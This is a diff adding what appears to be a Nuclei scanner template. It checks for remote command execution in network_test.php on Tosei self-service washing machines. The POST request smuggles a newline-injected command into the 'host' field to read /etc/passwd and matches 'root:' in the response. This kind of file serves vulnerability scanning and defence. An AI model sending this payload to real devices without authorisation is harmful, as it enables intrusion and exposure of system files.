@@ -1,0 +1,25 @@
+id: poc-yaml-tosei-self-service-washing-machine-test-php-rce
+info:
+  name: Tosei Self-Service Washing Machine network_test.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        POST /cgi-bin/network_test.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        host=%0acat${IFS}/etc/passwd%0a&command=ping
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+          - "ping"
+        part: body
